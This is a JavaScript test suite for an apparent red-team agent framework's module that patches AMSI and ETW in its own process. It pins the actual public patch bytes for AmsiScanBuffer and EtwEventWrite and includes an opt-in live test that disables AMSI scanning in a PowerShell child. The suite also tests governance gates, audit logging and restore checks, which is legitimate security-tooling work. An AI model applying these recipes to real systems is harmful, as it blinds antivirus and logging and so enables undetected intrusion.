// evasion.test.mjs — the EVASION INTERNALS TIER (stage 1, doctrine 2026-08-12):
// governed own-process AMSI/ETW neutralization. Hermetic by default: the PS-host layer
// is an injected runner, so the byte math (over FAKE memory regions), BOTH gate halves,
// the audit events + hash assertions, the restore-verifies-original contract, and the
// detoracle phrasing contract ('monitoring neutralized' NEVER 'clean') are all pinned
// without spawning a process or touching real memory.
//
// The LAST test is the GUARDED LIVE path (house pattern, opt-in): set
// VARVEL_LIVE_EVASION=1 to spawn a THROWAWAY powershell child, apply the amsi patch in
// THE CHILD ONLY, watch the official AMSI test string flip blocked->clear (measured),
// restore, watch it flip back, then kill the child. Default: SKIP. NOTE (by design):
// the live run may cause a Defender alert on this machine — that alert IS the
// measurement (in-memory, child-process-scoped, dies with the child). It is never run
// by the suite.
//
// Settings discipline (house pattern from settings.test.mjs): VARVEL_SETTINGS_FILE
// points at a temp file for THIS process and every engagement name is unique.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { CallbackChannel } from '../engine/callback.mjs';
import {
  EVASION_KINDS, EVASION_TECHNIQUES, EVASION_RECIPES,
  parseEvasionSpec, evasionGate, parseEvasionEvidence, PatchRegion,
} from '../engine/evasion.mjs';
import { runEvasionTask, powerShellEvasionRunner, EVASION_HOST_PATH } from '../agents/evasion.mjs';
import { SimAgent } from '../agents/sim-agent.mjs';
import { Settings } from '../engine/settings.mjs';
import { honestVerdict, MONITORING_NEUTRALIZED_PHRASE, buildSnapshotCommand } from '../tools/detoracle.mjs';
import { assessEvasion, parseEvasionResult } from '../tools/evasion.mjs';
import { spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';

process.env.VARVEL_SETTINGS_FILE = join(mkdtempSync(join(tmpdir(), 'vevasion-')), 'settings.json');

const sha256 = (buf) => crypto.createHash('sha256').update(buf).digest('hex');
let engSeq = 0;
const freshEng = () => 'evasion-' + (engSeq++) + '-' + Date.now();

// A fake 8-byte function prologue standing in for amsi.dll!AmsiScanBuffer's head; the
// patch span is its first 6 bytes (the recipe length — exact-span writes only).
const FAKE_PROLOGUE = Buffer.from([0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08, 0x57]);
const FAKE_SPAN = FAKE_PROLOGUE.subarray(0, 6);

// The evidence JSON a REAL agent-side op returns (mirrors the PS host's shape).
function hostResult(op, state, techs) {
  const techniques = {};
  for (const t of techs) {
    techniques[t] = {
      state, recipe: EVASION_RECIPES[t].dll + '!' + EVASION_RECIPES[t].export,
      originalSha256: sha256(FAKE_PROLOGUE.subarray(0, 6)),
      patchedSha256: EVASION_RECIPES[t].recipeSha256,
      restoredSha256: op === 'restore' ? sha256(FAKE_PROLOGUE.subarray(0, 6)) : null,
      byteVerified: op !== 'restore', restoreVerified: op === 'restore',
      verify: t === 'amsi'
        ? (op === 'restore' ? { probe: 'official-amsi-test-string', before: 'clear', after: 'blocked', flipBackProven: true } : { probe: 'official-amsi-test-string', before: 'blocked', after: 'clear', flipProven: true })
        : { probe: 'byte-reverify only', flipProven: false },
      note: null, error: null,
    };
  }
  return JSON.stringify({ op, pid: 4321, state, techniques, at: new Date().toISOString() });
}

// ---------------- pure patch-byte math over fake memory regions ----------------
test('PatchRegion: snapshot -> patch -> verify -> restore -> verify-original (the whole contract)', () => {
  const region = new PatchRegion(FAKE_SPAN);
  const patch = EVASION_RECIPES.amsi.patchBytes; // the real 6-byte public recipe
  // snapshot BEFORE: the original bytes and their hash are the restore source
  const snap = region.snapshot();
  assert.equal(snap.sha256, sha256(FAKE_SPAN));
  assert.ok(region.verify(FAKE_SPAN), 'pre-patch: region holds the original bytes');
  // patch: exact-span write, re-read PROVEN
  const p = region.patch(patch);
  assert.equal(p.patchedSha256, sha256(patch));
  assert.ok(region.verify(patch), 'post-patch: re-read equals the patch bytes');
  assert.ok(!region.verify(FAKE_SPAN), 'post-patch: the original bytes are really gone');
  // restore: the SNAPSHOT bytes go back, re-read PROVEN against the original
  const r = region.restore();
  assert.equal(r.restoreVerified, true);
  assert.equal(r.restoredSha256, snap.sha256, 'restored region hashes EXACTLY to the pre-patch snapshot');
  assert.ok(region.verify(FAKE_SPAN), 'restore-verifies-original: the region is byte-identical to before');
  assert.ok(!region.verify(patch));
});

test('PatchRegion: the safety rails hold (no snapshot, no write; exact spans only; restore failure is loud)', () => {
  const patch = EVASION_RECIPES.etw.patchBytes;
  // never write what you cannot restore
  assert.throws(() => new PatchRegion(FAKE_PROLOGUE).patch(patch), /no snapshot/);
  // exact-span writes only — a short/long write would build a franken-function
  const region = new PatchRegion(FAKE_PROLOGUE.subarray(0, 6));
  region.snapshot();
  assert.throws(() => region.patch(Buffer.from([0xc3])), RangeError);
  assert.throws(() => region.patch(Buffer.alloc(8, 0x90)), RangeError);
  assert.ok(region.verify(FAKE_PROLOGUE.subarray(0, 6)), 'a REFUSED patch never touched the region');
  // restore without a snapshot is refused, and a region constructor validates input
  assert.throws(() => new PatchRegion(Buffer.alloc(4)).restore(), /no snapshot/);
  assert.throws(() => new PatchRegion('not-bytes'), TypeError);
});

test('EVASION_RECIPES: the two stage-1 recipes are the pinned public byte sequences', () => {
  assert.deepEqual(EVASION_TECHNIQUES, ['amsi', 'etw']);
  assert.equal(EVASION_RECIPES.amsi.dll, 'amsi.dll');
  assert.equal(EVASION_RECIPES.amsi.export, 'AmsiScanBuffer');
  assert.equal(EVASION_RECIPES.amsi.patchHex, 'b857000780c3'); // mov eax,0x80070057; ret
  assert.equal(EVASION_RECIPES.etw.dll, 'ntdll.dll');
  assert.equal(EVASION_RECIPES.etw.export, 'EtwEventWrite');
  assert.equal(EVASION_RECIPES.etw.patchHex, 'b800000000c3'); // mov eax,0; ret
  for (const t of EVASION_TECHNIQUES) {
    assert.equal(EVASION_RECIPES[t].patchBytes.length, 6);
    assert.equal(EVASION_RECIPES[t].recipeSha256, sha256(EVASION_RECIPES[t].patchBytes), t + ' recipe hash pins the exact bytes');
  }
});

// ---------------- spec parse (the pre-queue / pre-exec refusal layer) ----------------
test('parseEvasionSpec: valid specs parse (dedup + case-fold); restore empty means all-patched', () => {
  assert.deepEqual(parseEvasionSpec('evasion-enable', '{"techniques":["AMSI","amsi","etw"]}'), { kind: 'evasion-enable', techniques: ['amsi', 'etw'] });
  assert.deepEqual(parseEvasionSpec('evasion-restore', '{"techniques":["etw"]}'), { kind: 'evasion-restore', techniques: ['etw'] });
  assert.deepEqual(parseEvasionSpec('evasion-restore', ''), { kind: 'evasion-restore', techniques: null }, 'empty restore = restore whatever is patched');
  assert.deepEqual(parseEvasionSpec('evasion-restore', '{}'), { kind: 'evasion-restore', techniques: null });
  assert.deepEqual(parseEvasionSpec('evasion-status', ''), { kind: 'evasion-status', techniques: null });
});

test('parseEvasionSpec: every malformed spec refuses loudly (nothing patches)', () => {
  assert.throws(() => parseEvasionSpec('evasion-enable', 'not json'), /not valid JSON/);
  assert.throws(() => parseEvasionSpec('evasion-enable', '{}'), /techniques must be an array/);
  assert.throws(() => parseEvasionSpec('evasion-enable', '{"techniques":[]}'), /empty/);
  assert.throws(() => parseEvasionSpec('evasion-enable', '{"techniques":"amsi"}'), /must be an array/);
  assert.throws(() => parseEvasionSpec('evasion-enable', '{"techniques":["amsi","sleepmask"]}'), /unknown technique "sleepmask"/, 'sleepmask-class is NOT stage 1 (native loader only)');
  assert.throws(() => parseEvasionSpec('evasion-enable', '{"techniques":["kernel"]}'), /unknown technique/, 'kernel anything: out of scope permanently');
  assert.throws(() => parseEvasionSpec('evasion-status', '{"techniques":["amsi"]}'), /takes no task data/);
  assert.throws(() => parseEvasionSpec('evasion-x', '{}'), /unknown kind/);
});

// ---------------- governance: the engagement gate (default OFF) + audit ----------------
test('channel gate: exec.evasion defaults OFF — all three kinds refuse LOUDLY + audited; other kinds unaffected', () => {
  const events = [];
  const ch = new CallbackChannel({ scope: { engagement: freshEng(), signedBy: 'test', cidrs: ['127.0.0.0/8'] }, onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { agentId } = ch.registerAgent({ label: 'gated' });
  for (const kind of EVASION_KINDS) {
    let err = null;
    try { ch.task(agentId, kind, '{"techniques":["amsi"]}'); } catch (e) { err = e; }
    assert.ok(err, kind + ' must throw');
    assert.equal(err.code, 'GOVERNANCE');
    assert.match(err.message, /exec\.evasion.*OFF/);
    assert.match(err.message, /Nothing patched/);
    assert.ok(events.some((e) => e.type === 'task.refused' && e.kind === kind), kind + ' refusal is audited');
  }
  assert.ok(!events.some((e) => e.type === 'task.queued' && EVASION_KINDS.has(e.kind)), 'a refused task never queues');
  assert.ok(!events.some((e) => e.type === 'evasion.task'), 'no audit event without a queue');
  assert.throws(() => ch.taskWhere({ all: true }, 'evasion-enable', '{"techniques":["amsi"]}'), (e) => e.code === 'GOVERNANCE', 'broadcast refuses identically');
  assert.ok(ch.task(agentId, 'shell', 'hostname'), 'the gate never touches ordinary kinds');
  assert.equal(evasionGate('evasion-never-enabled-xyz').ok, false, 'the gate fails CLOSED on an unreadable/unknown engagement');
});

test('channel gate ON: the task queues and the recipe sha256 lands in audit (the hash pins the ordered bytes)', () => {
  const eng = freshEng();
  Settings.for(eng).set('exec.evasion', true);
  const events = [];
  const ch = new CallbackChannel({ scope: { engagement: eng, signedBy: 'test', cidrs: ['127.0.0.0/8'] }, onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { agentId } = ch.registerAgent({ label: 'allowed' });
  const taskId = ch.task(agentId, 'evasion-enable', '{"techniques":["amsi","etw"]}');
  assert.ok(taskId);
  const ev = events.find((e) => e.type === 'evasion.task');
  assert.ok(ev, 'the queue-time audit event exists');
  assert.equal(ev.taskId, taskId);
  assert.deepEqual(ev.techniques, ['amsi', 'etw']);
  assert.equal(ev.recipes.amsi.recipeSha256, EVASION_RECIPES.amsi.recipeSha256);
  assert.equal(ev.recipes.etw.recipeSha256, EVASION_RECIPES.etw.recipeSha256);
  assert.equal(ev.recipes.amsi.export, 'AmsiScanBuffer');
  // restore with empty data: the audit names ALL known recipes (the agent restores what IT has patched)
  ch.task(agentId, 'evasion-restore', '');
  const ev2 = events.filter((e) => e.type === 'evasion.task')[1];
  assert.equal(ev2.techniques, null);
  assert.deepEqual(Object.keys(ev2.recipes), EVASION_TECHNIQUES);
  // the spec gate still bites with the engagement gate open: unknown technique refuses pre-queue
  assert.throws(() => ch.task(agentId, 'evasion-enable', '{"techniques":["udrl"]}'), (e) => e.code === 'GOVERNANCE' && /unknown technique/.test(e.message));
});

// ---------------- agent-side executor (injected runner — the hermetic seam) ----------------
test('runEvasionTask: refusal texts are loud; an attempt is op-FIRST evidence JSON', async () => {
  const bad = await runEvasionTask('evasion-enable', 'garbage', { runner: async () => ({ stdout: '{}' }) });
  assert.match(bad, /^evasion-enable REJECTED: /);
  const none = await runEvasionTask('evasion-enable', '{"techniques":["amsi"]}', {});
  assert.match(none, /^evasion-enable REFUSED: /);
  // a real attempt: job contract + result normalization
  let jobSeen = null;
  const runner = async (jobJson) => { jobSeen = jobJson; return { stdout: hostResult('enable', 'patched', ['amsi']), stderr: '' }; };
  const res = JSON.parse(await runEvasionTask('evasion-enable', '{"techniques":["amsi"]}', { runner }));
  assert.deepEqual(Object.keys(res).slice(0, 3), ['op', 'pid', 'state'], 'op leads — the 120-char ledger preview always carries it');
  assert.equal(res.op, 'enable');
  assert.equal(res.state, 'patched');
  assert.equal(res.techniques.amsi.state, 'patched');
  assert.equal(res.techniques.amsi.verify.flipProven, true);
  const job = JSON.parse(jobSeen);
  assert.equal(job.op, 'enable');
  assert.deepEqual(job.techniques, ['amsi']);
  assert.ok(!('patchBytes' in job) && !('patch' in job), 'the channel/job NEVER ships patch bytes — the recipe lives agent-side only');
  // restore with empty data -> techniques null (restore whatever is patched)
  let job2 = null;
  await runEvasionTask('evasion-restore', '', { runner: async (j) => { job2 = j; return { stdout: hostResult('restore', 'restored', ['amsi']) }; } });
  assert.equal(JSON.parse(job2).techniques, null);
});

test('runEvasionTask: runner failures stay honest (failed state, never a dressed-up win)', async () => {
  const timeout = JSON.parse(await runEvasionTask('evasion-enable', '{"techniques":["amsi"]}', { runner: async () => ({ stdout: '', stderr: '', error: 'evasion host op timeout after 50ms — host killed' }) }));
  assert.equal(timeout.state, 'failed');
  assert.match(timeout.error, /timeout/i);
  const garbage = JSON.parse(await runEvasionTask('evasion-status', '', { runner: async () => ({ stdout: 'host noise, no json', stderr: '' }) }));
  assert.equal(garbage.state, 'failed');
  assert.match(garbage.error, /unparseable/);
  const threw = JSON.parse(await runEvasionTask('evasion-restore', '', { runner: async () => { throw new Error('boom'); } }));
  assert.equal(threw.state, 'failed');
  assert.match(threw.error, /boom/);
});

// ---------------- the default runner's plumbing (fake child process — still hermetic) ----------------
function fakeEvasionChild({ lines = [], hang = false } = {}) {
  const c = new EventEmitter();
  c.stdin = new PassThrough();
  c.stdout = new PassThrough();
  c.stderr = new PassThrough();
  c.killed = false;
  c.kill = () => { c.killed = true; setImmediate(() => c.emit('close')); };
  let buf = '';
  c.stdin.on('data', (d) => {
    buf += d;
    let i;
    while ((i = buf.indexOf('\n')) >= 0) {
      const job = buf.slice(0, i).trim();
      buf = buf.slice(i + 1);
      c.jobs = c.jobs || [];
      c.jobs.push(job);
      if (hang || !job) continue;
      const op = JSON.parse(job).op;
      c.stdout.write(hostResult(op, op === 'enable' ? 'patched' : op === 'restore' ? 'restored' : 'untouched', ['amsi']) + '\n');
    }
  });
  return c;
}

test('powerShellEvasionRunner: one PERSISTENT host serves ordered ops; timeout kills; spawn failure is honest', async () => {
  const child = fakeEvasionChild();
  const runner = powerShellEvasionRunner({ spawnFn: () => child, timeoutMs: 5000 });
  const r1 = JSON.parse(await runEvasionTask('evasion-enable', '{"techniques":["amsi"]}', { runner }));
  assert.equal(r1.state, 'patched');
  const r2 = JSON.parse(await runEvasionTask('evasion-restore', '', { runner }));
  assert.equal(r2.state, 'restored');
  const r3 = JSON.parse(await runEvasionTask('evasion-status', '', { runner }));
  assert.equal(r3.state, 'untouched');
  assert.equal(child.jobs.length, 3, 'ONE persistent child served all three ops (enable/restore/status observe ONE process)');
  runner.close();
  assert.ok(child.killed, 'close() kills the host — its patch state dies with the process');

  const hung = fakeEvasionChild({ hang: true });
  const slow = powerShellEvasionRunner({ spawnFn: () => hung, timeoutMs: 50 });
  const r4 = JSON.parse(await runEvasionTask('evasion-enable', '{"techniques":["amsi"]}', { runner: slow }));
  assert.equal(r4.state, 'failed');
  assert.match(r4.error, /timeout/);
  assert.ok(hung.killed, 'a wedged host is killed — the task loop survives');

  const dead = powerShellEvasionRunner({ spawnFn: () => { throw new Error('ENOENT'); } });
  const r5 = JSON.parse(await runEvasionTask('evasion-enable', '{"techniques":["amsi"]}', { runner: dead }));
  assert.equal(r5.state, 'failed');
  assert.match(r5.error, /spawn failed/);
});

// ---------------- end-to-end over a REAL channel + REAL SimAgent (fake runner) ----------------
async function wiredAgent({ evasion, evasionRunner }) {
  const eng = freshEng();
  Settings.for(eng).set('exec.evasion', true); // channel half of the gate: OPEN
  const events = [];
  const ch = new CallbackChannel({ scope: { engagement: eng, signedBy: 'test', cidrs: ['127.0.0.0/8'] }, onEvent: (t, o) => events.push({ type: t, ...o }) });
  await ch.arm(0);
  const { agentId, token } = ch.registerAgent({ label: 'evasion-e2e' });
  const dir = mkdtempSync(join(tmpdir(), 'vevasion-sbx-'));
  const agent = new SimAgent({ url: 'http://127.0.0.1:' + ch.port, agentId, token, dir, interval: 200, jitter: 0, evasion, evasionRunner });
  return { ch, agent, agentId, events, dir };
}

test('e2e: enable -> status -> restore routes channel -> agent -> audit, hashes + verification evidence land', async () => {
  const evasionRunner = async (jobJson) => {
    const job = JSON.parse(jobJson);
    return { stdout: hostResult(job.op, job.op === 'enable' ? 'patched' : job.op === 'restore' ? 'restored' : 'patched', ['amsi']), stderr: '' };
  };
  const { ch, agent, agentId, events } = await wiredAgent({ evasion: true, evasionRunner });
  try {
    // ENABLE
    const t1 = ch.task(agentId, 'evasion-enable', '{"techniques":["amsi"]}');
    assert.equal(await agent.tick(), true);
    const r1 = ch.results(agentId, { taskId: t1 });
    assert.equal(JSON.parse(r1[0].data).state, 'patched');
    const applied = events.find((e) => e.type === 'evasion.applied');
    assert.ok(applied, 'the intake audited the applied patch');
    assert.equal(applied.taskId, t1);
    assert.equal(applied.pid, 4321);
    assert.equal(applied.techniques.amsi.state, 'patched');
    assert.equal(applied.techniques.amsi.originalSha256, sha256(FAKE_PROLOGUE.subarray(0, 6)), 'audit carries the ORIGINAL region hash');
    assert.equal(applied.techniques.amsi.patchedSha256, EVASION_RECIPES.amsi.recipeSha256, 'audit carries the PATCHED region hash');
    assert.equal(applied.techniques.amsi.flipProven, true, 'audit carries the measured blocked->clear flip');
    // STATUS
    const t2 = ch.task(agentId, 'evasion-status', '');
    assert.equal(await agent.tick(), true);
    ch.results(agentId, { taskId: t2 });
    assert.ok(events.some((e) => e.type === 'evasion.status' && e.techniques.amsi.state === 'patched'), 'status audited honestly');
    // RESTORE
    const t3 = ch.task(agentId, 'evasion-restore', '{"techniques":["amsi"]}');
    assert.equal(await agent.tick(), true);
    const r3 = ch.results(agentId, { taskId: t3 });
    assert.equal(JSON.parse(r3[0].data).state, 'restored');
    const restored = events.find((e) => e.type === 'evasion.restored');
    assert.ok(restored, 'the intake audited the restore');
    assert.equal(restored.techniques.amsi.restoreVerified, true, 'audit carries restore-verified');
    assert.equal(restored.techniques.amsi.restoredSha256, sha256(FAKE_PROLOGUE.subarray(0, 6)), 'the restored region hashes to the ORIGINAL bytes');
    // the full lifecycle event set
    for (const t of ['task.queued', 'evasion.task', 'task.delivered', 'result.received', 'evasion.applied', 'evasion.restored']) {
      assert.ok(events.some((e) => e.type === t), 'audited: ' + t);
    }
  } finally { agent.stop(); await ch.disarm(); }
});

test('e2e: a refusal text emits NO evidence event (audit is never fabricated from unverifiable data)', async () => {
  const { ch, agent, agentId, events } = await wiredAgent({ evasion: true, evasionRunner: async () => ({ stdout: 'evasion-enable REFUSED: simulated agent-side refusal', stderr: '' }) });
  try {
    const t1 = ch.task(agentId, 'evasion-enable', '{"techniques":["amsi"]}');
    assert.equal(await agent.tick(), true);
    const rs = ch.results(agentId, { taskId: t1 });
    assert.match(rs[0].data, /REFUSED/);
    assert.ok(!events.some((e) => e.type === 'evasion.applied'), 'no applied event for a refusal');
  } finally { agent.stop(); await ch.disarm(); }
});

test('e2e: agent-side gate OFF refuses even when the engagement gate is OPEN (both halves must say yes)', async () => {
  let ran = false;
  const { ch, agent, agentId } = await wiredAgent({ evasion: false, evasionRunner: async () => { ran = true; return { stdout: '{}' }; } });
  try {
    for (const kind of EVASION_KINDS) {
      const taskId = ch.task(agentId, kind, kind === 'evasion-enable' ? '{"techniques":["amsi"]}' : '');
      assert.equal(await agent.tick(), true);
      const rs = ch.results(agentId, { taskId });
      assert.equal(rs.length, 1);
      assert.match(rs[0].data, new RegExp('^' + kind + ' REFUSED: '));
      assert.match(rs[0].data, /--evasion/);
    }
    assert.equal(ran, false, 'the runner never fires on a refusal');
  } finally { agent.stop(); await ch.disarm(); }
});

// ---------------- the detoracle phrasing contract (the honesty line) ----------------
test('phrasing contract: under active neutralization a quiet window is NEVER clean', () => {
  assert.equal(MONITORING_NEUTRALIZED_PHRASE, 'monitoring neutralized (self-reported, patch-verified)');
  const clean = { verdict: 'clean', newDetections: 0, newActions: 0, note: 'no detection observed...' };
  const v = honestVerdict(clean, { monitoringNeutralized: true });
  assert.equal(v.verdict, 'unmonitored', 'clean under an active patch is reclassified unmonitored');
  assert.equal(v.rawVerdict, 'clean', 'the raw verdict survives as evidence');
  assert.match(v.note, /monitoring neutralized \(self-reported, patch-verified\)/);
  assert.match(v.note, /never be reported as clean/);
  // EVERY input tier: neutralized output is never 'clean'
  for (const tier of ['clean', 'detected', 'blocked', 'unmonitored', 'unknown']) {
    const out = honestVerdict({ verdict: tier, note: 'x' }, { monitoringNeutralized: true });
    assert.notEqual(out.verdict, 'clean', tier + ' must never render clean under neutralization');
  }
  // a detection that STILL fired passes through untouched — the patch covers the agent's
  // own process, not every sensor; a measured detection is reported as a detection
  const det = honestVerdict({ verdict: 'detected', newDetections: 1, note: 'Defender logged a detection' }, { monitoringNeutralized: true });
  assert.equal(det.verdict, 'detected');
  assert.equal(det.rawVerdict, undefined);
  // pre-existing unmonitored keeps its tier and gains the phrase
  const un = honestVerdict({ verdict: 'unmonitored', note: 'rtp off' }, { monitoringNeutralized: true });
  assert.equal(un.verdict, 'unmonitored');
  assert.match(un.note, /monitoring neutralized/);
  // no flag: the verdict object passes through verbatim
  const same = honestVerdict(clean, {});
  assert.equal(same.verdict, 'clean');
  assert.equal(same, clean);
});

// ---------------- the operator loop (scripted taskAgent — the detoracle pattern) ----------------
test('assessEvasion: enable -> verify -> probe -> restore -> status, phrased verdict, hashes throughout', async () => {
  const calls = [];
  const taskAgent = async (agentId, kind, data) => {
    calls.push({ kind, data });
    if (kind === 'evasion-enable') return hostResult('enable', 'patched', ['amsi']);
    if (kind === 'evasion-restore') return hostResult('restore', 'restored', ['amsi']);
    if (kind === 'evasion-status') return hostResult('status', 'restored', ['amsi']);
    return 'DETOR T1 D2 B0 R1'; // both snapshots identical -> raw diff 'clean'
  };
  const v = await assessEvasion({ taskAgent, agentId: 'agent-x', techniques: ['amsi'], probeCommand: 'whoami', settleMs: 5 });
  assert.equal(v.refused, false);
  assert.equal(v.monitoringNeutralized, true);
  // THE CONTRACT: the raw diff read 'clean'; the reported verdict may NOT
  assert.equal(v.probe.rawVerdict, 'clean');
  assert.equal(v.verdict, 'unmonitored');
  assert.equal(v.phrase, 'monitoring neutralized (self-reported, patch-verified)');
  assert.match(v.note, /never|NOT clean/i);
  // ordering: enable -> snapshot -> probe -> snapshot -> restore -> status
  assert.deepEqual(calls.map((c) => c.kind), ['evasion-enable', 'shell', 'shell', 'shell', 'evasion-restore', 'evasion-status']);
  assert.equal(calls[1].data, buildSnapshotCommand());
  assert.equal(JSON.parse(calls[0].data).techniques[0], 'amsi');
  // enable evidence surfaced with hashes + the measured flip
  assert.equal(v.enabled.techniques.amsi.originalSha256, sha256(FAKE_PROLOGUE.subarray(0, 6)));
  assert.equal(v.enabled.techniques.amsi.flipProven, true);
  // restore leg verified against the ORIGINAL bytes, and status-after closed the loop
  assert.equal(v.restoreVerified, true);
  assert.equal(v.restored.techniques.amsi.restoredSha256, v.enabled.techniques.amsi.originalSha256, 'restored hash == original hash (reversible, proven)');
  assert.equal(v.statusAfter.state, 'restored');
});

test('assessEvasion: a detection that still fires is reported as detected (the patch is not a blanket)', async () => {
  let snaps = 0;
  const taskAgent = async (agentId, kind) => {
    if (kind === 'evasion-enable') return hostResult('enable', 'patched', ['amsi']);
    if (kind === 'evasion-restore') return hostResult('restore', 'restored', ['amsi']);
    if (kind === 'evasion-status') return hostResult('status', 'restored', ['amsi']);
    snaps++;
    return snaps === 1 ? 'DETOR T1 D2 B0 R1' : 'DETOR T1 D3 B0 R1'; // 1116 grew -> detected
  };
  const v = await assessEvasion({ taskAgent, agentId: 'agent-x', techniques: ['amsi'], probeCommand: 'net user', settleMs: 5 });
  assert.equal(v.verdict, 'detected', 'a still-firing detection passes through untouched — honest both ways');
  assert.equal(v.phrase, null);
  assert.equal(v.restoreVerified, true, 'the restore leg still ran and verified (cleanup is not optional)');
});

test('assessEvasion: a governance refusal is verdict unknown + refused — nothing probed, nothing claimed', async () => {
  const calls = [];
  const taskAgent = async (agentId, kind) => { calls.push(kind); return "evasion-enable refused: engagement setting 'exec.evasion' is OFF ..."; };
  const v = await assessEvasion({ taskAgent, agentId: 'agent-x', techniques: ['amsi'], settleMs: 5 });
  assert.equal(v.refused, true);
  assert.equal(v.verdict, 'unknown');
  assert.equal(v.monitoringNeutralized, false);
  assert.match(v.note, /REFUSED|refused/);
  assert.deepEqual(calls, ['evasion-enable'], 'a refusal stops the loop — no probe, no restore theater');
  // an UNPARSEABLE enable (truncated preview) is NOT called a refusal and stops the loop loudly
  const v2 = await assessEvasion({ taskAgent: async () => '{"op":"enable","pid":1,"state":"pat', agentId: 'agent-x', techniques: ['amsi'], settleMs: 5 });
  assert.equal(v2.refused, false);
  assert.equal(v2.verdict, 'unknown');
  assert.match(v2.note, /no parseable evidence/);
  // a restore that does NOT verify is a loud loose end, never a quiet pass
  const v3 = await assessEvasion({
    taskAgent: async (a, kind) => {
      if (kind === 'evasion-enable') return hostResult('enable', 'patched', ['amsi']);
      if (kind === 'evasion-restore') return JSON.stringify({ op: 'restore', pid: 1, state: 'failed', techniques: { amsi: { state: 'failed', restoreVerified: false, error: 'restore write did NOT verify' } }, at: new Date().toISOString() });
      return hostResult('status', 'patched', ['amsi']);
    },
    agentId: 'agent-x', techniques: ['amsi'], settleMs: 5,
  });
  assert.equal(v3.restoreVerified, false);
  assert.match(v3.note, /treat the agent as still-patched/);
  // spec gate: bad technique lists throw BEFORE any task rides the wire
  await assert.rejects(() => assessEvasion({ taskAgent: async () => '', agentId: 'x', techniques: ['sleepmask'] }), /unknown technique/);
});

// ---------------- GUARDED LIVE: real child, real amsi patch, measured flip + flip-back ----------------
// Opt-in ONLY (VARVEL_LIVE_EVASION=1). Expected side effect, stated plainly: scanning the
// official AMSI test string may raise a real Defender alert on this host — contained
// (in-memory, child-process-scoped, gone when the child dies) and itself the measurement.
const LIVE = process.env.VARVEL_LIVE_EVASION === '1';

test('LIVE (guarded): throwaway PS child — amsi patch flips the official test string blocked->clear, restore flips it back', async (t) => {
  if (!LIVE) return t.skip('guarded live test — set VARVEL_LIVE_EVASION=1 to run (may raise a contained Defender alert by design)');
  if (process.platform !== 'win32') return t.skip('windows-only (amsi.dll/ntdll.dll in-process recipes)');
  const ps = spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', 'exit 0'], { windowsHide: true });
  if (ps.error || ps.status !== 0) return t.skip('powershell.exe unavailable on this host');
  if (!existsSync(EVASION_HOST_PATH)) return t.skip('agents/evasion-host.ps1 missing');

  const runner = powerShellEvasionRunner({ timeoutMs: 60000 });
  try {
    // ENABLE: patch amsi.dll!AmsiScanBuffer IN THE CHILD ONLY, with measured proof
    const en = JSON.parse(await runEvasionTask('evasion-enable', '{"techniques":["amsi"]}', { runner }));
    assert.equal(en.state, 'patched', JSON.stringify(en.techniques.amsi));
    assert.equal(en.techniques.amsi.byteVerified, true, 'the write was re-read and proven');
    assert.ok(en.techniques.amsi.originalSha256, 'the original bytes were snapshotted first (cleanup doctrine)');
    assert.notEqual(en.techniques.amsi.originalSha256, en.techniques.amsi.patchedSha256);
    if (en.techniques.amsi.verify.before !== 'blocked') {
      // honest skip: without a blocked baseline the flip is unprovable on this host
      await runEvasionTask('evasion-restore', '{"techniques":["amsi"]}', { runner });
      return t.skip('the official test string was not blocked pre-patch on this host (before=' + en.techniques.amsi.verify.before + ') — the flip is unprovable here');
    }
    assert.equal(en.techniques.amsi.verify.after, 'clear', 'post-patch the scan never evaluates the content');
    assert.equal(en.techniques.amsi.verify.flipProven, true, 'MEASURED: blocked -> clear');
    // STATUS: live re-read still shows patched
    const st = JSON.parse(await runEvasionTask('evasion-status', '', { runner }));
    assert.equal(st.techniques.amsi.state, 'patched');
    // RESTORE: original bytes back, re-verified, flip-BACK measured
    const re = JSON.parse(await runEvasionTask('evasion-restore', '{"techniques":["amsi"]}', { runner }));
    assert.equal(re.state, 'restored', JSON.stringify(re.techniques.amsi));
    assert.equal(re.techniques.amsi.restoreVerified, true);
    assert.equal(re.techniques.amsi.restoredSha256, en.techniques.amsi.originalSha256, 'restored region == original bytes');
    assert.equal(re.techniques.amsi.verify.after, 'blocked', 'the flip-back is measured: clear -> blocked');
    assert.equal(re.techniques.amsi.verify.flipBackProven, true);
  } finally {
    runner.close(); // the child dies; anything it held dies with it (in-memory only)
  }
});
